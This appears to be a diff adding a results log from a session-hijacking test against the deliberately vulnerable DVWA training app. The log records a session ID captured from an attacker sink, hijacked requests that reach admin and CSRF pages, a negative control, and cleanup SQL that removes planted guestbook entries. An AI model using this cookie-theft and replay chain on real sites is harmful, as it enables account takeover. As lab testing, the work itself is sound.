@@ -1,0 +1,14 @@
+﻿--- guestbook_all: {"rows": "--------------\nSELECT id,name,comment FROM dvwa.guestbook ORDER BY id\n--------------\n\nERROR 1054 (42S22) at line 1: Unknown column 'id' in 'SELECT'"}
+--- guestbook_columns: {"cols": "comment_id\tsmallint(5) unsigned\tNO\tPRI\tNULL\tauto_increment\ncomment\tvarchar(300)\tYES\t\tNULL\t\nname\tvarchar(100)\tYES\t\tNULL"}
+--- count_before_cleanup: {"n": "5"}
+--- stolen_session_id_from_sink: {"id": "036dd2f56fcc1ec3e5538e1643d3f51e"}
+--- hijack_index: {"status": 200, "title": "Welcome :: Damn Vulnerable Web Application (DVWA)", "admin_welcome": true}
+--- hijack_protected_page: {"status": 200, "loc": null, "is_csrf_page": true}
+--- hijack_negative_control: {"status": 302, "loc": "login.php"}
+--- cleanup_sql: {"sql": "DELETE FROM dvwa.guestbook WHERE name='loop3t4';", "result": "2"}
+--- count_after_cleanup: {"n": "3"}
+--- guestbook_after_cleanup: {"rows": "--------------\nSELECT id,name,comment FROM dvwa.guestbook ORDER BY id\n--------------\n\nERROR 1054 (42S22) at line 1: Unknown column 'id' in 'SELECT'"}
+--- users_untouched: {"rows": "admin\ngordonb\n1337\npablo\nsmithy"}
+{"rc": "ok", "stolen": "036dd2f56fcc1ec3e5538e1643d3f51e"}
+{"rc": 0, "stdout_len": 1177, "stderr_len": 0}
+
